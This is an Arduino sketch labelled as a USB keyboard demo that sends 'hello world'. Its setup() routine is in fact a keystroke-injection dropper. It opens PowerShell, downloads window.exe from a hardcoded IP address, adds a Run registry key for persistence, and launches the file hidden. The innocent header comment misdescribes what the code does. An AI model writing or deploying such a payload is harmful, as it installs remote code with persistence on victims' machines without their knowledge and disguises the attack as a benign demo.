/* Arduino USB Keyboard HID demo */
/* Send "hello world" to computer through USB every 5 seconds */

#define MOD_CONTROL_LEFT    (1<<0)
#define MOD_SHIFT_LEFT      (1<<1)
#define MOD_ALT_LEFT        (1<<2)
#define MOD_GUI_LEFT        (1<<3)
#define MOD_CONTROL_RIGHT   (1<<4)
#define MOD_SHIFT_RIGHT     (1<<5)
#define MOD_ALT_RIGHT       (1<<6)
#define MOD_GUI_RIGHT       (1<<7)

#define KEY_A       4
#define KEY_B       5
#define KEY_C       6
#define KEY_D       7
#define KEY_E       8
#define KEY_F       9
#define KEY_G       10
#define KEY_H       11
#define KEY_I       12
#define KEY_J       13
#define KEY_K       14
#define KEY_L       15
#define KEY_M       16
#define KEY_N       17
#define KEY_O       18
#define KEY_P       19
#define KEY_Q       20
#define KEY_R       21
#define KEY_S       22
#define KEY_T       23
#define KEY_U       24
#define KEY_V       25
#define KEY_W       26
#define KEY_X       27
#define KEY_Y       28
#define KEY_Z       29
#define KEY_1       30
#define KEY_2       31
#define KEY_3       32
#define KEY_4       33
#define KEY_5       34
#define KEY_6       35
#define KEY_7       36
#define KEY_8       37
#define KEY_9       38
#define KEY_0       39

#define KEY_ENTER   40
#define KEY_ESCAPE  41
#define KEY_BACKSPACE  42
#define KEY_TAB     43
#define KEY_SPACE   44
#define KEY_MINUS   45
#define KEY_EQUALS  46
#define KEY_LBRACKET 47
#define KEY_RBRACKET 48
#define KEY_BACKSLASH 49
#define KEY_NONUS_NUMBER 50
#define KEY_SEMICOLON 51
#define KEY_QUOTE   52
#define KEY_TILDE   53
#define KEY_COMMA   54
#define KEY_PERIOD  55
#define KEY_SLASH   56
#define KEY_CAPSLOCK 57

#define KEY_F1      58
#define KEY_F2      59
#define KEY_F3      60
#define KEY_F4      61
#define KEY_F5      62
#define KEY_F6      63
#define KEY_F7      64
#define KEY_F8      65
#define KEY_F9      66
#define KEY_F10     67
#define KEY_F11     68
#define KEY_F12     69

#define KEY_PRNTSCRN    70
#define KEY_SCROLLLOCK  71
#define KEY_PAUSE       72
#define KEY_INSERT      73
#define KEY_HOME        74
#define KEY_PAGEUP      75
#define KEY_DELETE      76
#define KEY_END         77
#define KEY_PAGEDOWN    78
#define KEY_RIGHT_ARROW 79
#define KEY_LEFT_ARROW  80
#define KEY_DOWN_ARROW  81
#define KEY_UP_ARROW    82

#define KEY_NUM_LOCK    83

#define KEY_NUM_DIV     84
#define KEY_NUM_MUL     85
#define KEY_NUM_SUB     86
#define KEY_NUM_ADD     87

#define KEY_NUM_ENTER   88
#define KEY_NUM_1       89
#define KEY_NUM_2       90
#define KEY_NUM_3       91
#define KEY_NUM_4       92
#define KEY_NUM_5       93
#define KEY_NUM_6       94
#define KEY_NUM_7       95
#define KEY_NUM_8       96
#define KEY_NUM_9       97
#define KEY_NUM_0       98
#define KEY_NUM_DOT     99


#define KEY_ARROW_LEFT 0x50
  


uint8_t buf[8] = { 0 };	/* Keyboard report buffer */

void Print(char* chp){
  
  
    uint8_t buf[8] = { 0 };  /* Keyboard report buffer */
    
    while (*chp) {      
      if ((*chp >= 'a') && (*chp <= 'z')) {
        buf[2] = *chp - 'a' + 4;
      } else if ((*chp >= 'A') && (*chp <= 'Z')) {
        buf[0] = MOD_SHIFT_LEFT;  /* Caps */
        buf[2] = *chp - 'A' + 4;
      } else if ((*chp >= '1') && (*chp <= '9')) {
        buf[2] = *chp - '1' + 30;
      } else if (*chp == '0') {
        buf[2] = KEY_0;
      } else {
        switch (*chp) {
          case ' ':
            buf[2] = KEY_SPACE; // Space
            break;
          case '-':
            buf[2] = KEY_MINUS;
            break;
          case '_':
            buf[0] = MOD_SHIFT_LEFT;
            buf[2] = KEY_MINUS;
            break;
          case '(':
            buf[0] = MOD_SHIFT_LEFT;
            buf[2] = KEY_9;
            break;
          case ')':
            buf[0] = MOD_SHIFT_LEFT;
            buf[2] = KEY_0;
            break;
          case '=':
            buf[2] = KEY_EQUALS;
            break;
          case '[':
            buf[2] = KEY_LBRACKET;
            break;
          case ']':
            buf[2] = KEY_RBRACKET;
            break;
          case '\\':
            buf[2] = KEY_BACKSLASH;
            break;
          case ';':
            buf[2] = KEY_SEMICOLON;
            break;
          case ':':
            buf[0] = MOD_SHIFT_LEFT;  /* Caps */
            buf[2] = KEY_SEMICOLON;
            break;
            case '"':
            buf[0] = MOD_SHIFT_LEFT;
            buf[2] = KEY_QUOTE;
            break;
          case '~':
            buf[2] = KEY_TILDE;
            break;
          case '$':
            buf[0] = MOD_SHIFT_LEFT;
            buf[2] = KEY_4;
            break;
          case ',':
            buf[2] = KEY_COMMA;
            break;
          case '/':
            buf[2] = KEY_SLASH;
            break;
          case '@':
            buf[0] = MOD_SHIFT_LEFT;  /* Caps */
            buf[2] = KEY_2;
            break;
          default:
            /* Character not handled. To do: add rest of chars from HUT1_11.pdf */
            buf[2] = KEY_PERIOD;// Period
            break;
          }
      }
      
        Serial.write(buf, 8); // Send keystroke
        buf[0] = 0;
        buf[2] = 0;
        Serial.write(buf, 8); // Release key
        chp++;
    }
 }    

    



void KeyStroke(byte a){
  uint8_t buf[8] = { 0 };
  buf[2] = a;
  Serial.write(buf, 8);
  buf[2] = 0;
  Serial.write(buf, 8);
  }

void KeyStroke(byte a, byte b){
  uint8_t buf[8] = { 0 };
  buf[0] = a;
  buf[2] = b;
  Serial.write(buf, 8);
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);
  }





void setup() 
{
  Serial.begin(9600);

  KeyStroke(MOD_GUI_LEFT, KEY_R);
  delay(500);
  char *str2 = "cmd";
  char *chp2 = str2;
  Print(chp2);
  KeyStroke(KEY_ENTER);
  delay(500);
  char *str = "powershell";
  char *chp = str;
  Print(str);
  KeyStroke(KEY_ENTER);
  char *str3 = "$P = new-object system.net.webclient";
  char *chp3 = str3;
  Print(chp3);
  delay(500);
  KeyStroke(KEY_ENTER);
  delay(500);
  char *str4 = "$P.downloadfile(\"http://140.114.200.28/window.exe\",\"D:/window.exe\")";
  char *chp4 = str4;
  Print(chp4);
  delay(500);
  KeyStroke(KEY_ENTER);
  
  char *str6 = "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v window /t REG_SZ /d \"D:/window.exe\" /f ";
  char *chp6 = str6;
  Print(chp6);
  KeyStroke(KEY_ENTER);
  delay(500);
  
  char *str7 = "Start-Process D:/window.exe -WindowStyle Hidden;exit";
  char *chp7 = str7;
  Print(chp7);
  
  
  //delay(500);
  
  KeyStroke(KEY_ENTER);
  
  
  delay(500);
  KeyStroke(KEY_ENTER);
  char *str9 = "exit";
  char *chp9 = str9;
  Print(chp9);
  //delay(1500);
  KeyStroke(KEY_ENTER);
  
}



void loop() 
{
    
    
    
  
  
}
